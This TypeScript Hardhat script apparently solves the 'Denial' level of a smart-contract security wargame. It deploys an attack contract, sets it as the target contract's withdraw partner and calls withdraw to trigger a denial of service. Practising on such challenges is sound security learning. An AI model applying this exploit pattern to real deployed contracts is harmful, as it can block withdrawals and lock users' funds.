import { ethers, waffle } from "hardhat";
import { Denial, Denial__factory, HackDenial, HackDenial__factory } from "../typechain";

async function main() {
  const [addr1] = await ethers.getSigners();
  const provider = waffle.provider;
  const deployedAddress = '0x28596da67F7760f378E85D265313FE421D8380c7';
  const denialInstance: Denial = Denial__factory.connect(deployedAddress, addr1);

  const attackInstance: HackDenial = await new HackDenial__factory(addr1).deploy({ gasLimit: 2000000 });
  await attackInstance.deployed();
  console.log("deployed : " + attackInstance.address)

  await (await denialInstance.setWithdrawPartner(attackInstance.address)).wait(1)
  await (await denialInstance.withdraw({ gasLimit: 1000000 })).wait(1)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
